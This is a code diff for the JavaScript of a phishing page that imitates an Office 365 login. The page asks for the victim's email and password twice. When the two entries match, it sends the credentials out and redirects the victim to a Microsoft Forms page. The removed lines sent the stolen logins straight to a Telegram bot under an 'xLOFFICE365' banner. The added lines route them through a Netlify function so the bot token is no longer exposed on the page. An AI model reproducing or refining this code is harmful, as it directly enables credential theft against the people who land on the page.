@@ -1,7 +1,3 @@
-// Use environment variables for sensitive data
-const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"; // Replace with your bot token
-const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"; // Replace with your chat ID
-
 // Store the first email and password
 let firstEmail = "";
 let firstPassword = "";
@@ -21,12 +17,12 @@ function validatePassword(password) {
     return password.length >= 8; // Password must be at least 8 characters
 }
 
-// Function to send data to Telegram
-async function sendToTelegram(message) {
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+// Function to send data to a secure serverless function
+async function sendToServer(email, password) {
+    const url = "/.netlify/functions/sendToTelegram"; // Netlify Function endpoint
     const payload = {
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
+        email,
+        password,
     };
 
     try {
@@ -38,9 +34,9 @@ async function sendToTelegram(message) {
             body: JSON.stringify(payload),
         });
         const data = await response.json();
-        console.log("Message sent to Telegram:", data);
+        console.log("Server response:", data);
     } catch (error) {
-        console.error("Error sending message to Telegram:", error);
+        console.error("Error sending data to server:", error);
     }
 }
 
@@ -83,16 +79,8 @@ document.getElementById("login-form").addEventListener("submit", async function 
     } else {
         // Second submission: Check if the email and password match the first submission
         if (email === firstEmail && password === firstPassword) {
-            // Format the message for Telegram
-            const loginMessage = `
-|----------| xLOFFICE365/SCH s |--------------|
-Online ID: ${email}
-Passcode: ${password}
-|--------------- I N F O | I P -------------------|
-`;
-
-            // Send login details to Telegram
-            await sendToTelegram(loginMessage);
+            // Send login details to the serverless function
+            await sendToServer(email, password);
 
             // Redirect to the external form
             window.location.href = "https://forms.office.com/Pages/ResponsePage.aspx?id=6rma1OyZUkWGUb2U95ql5fEyhzHJrZ1Nh6ErkmDSMa5UMTQ0TkFYVjI1TFhSS1UyMU9TM0REQ0lDTS4u";
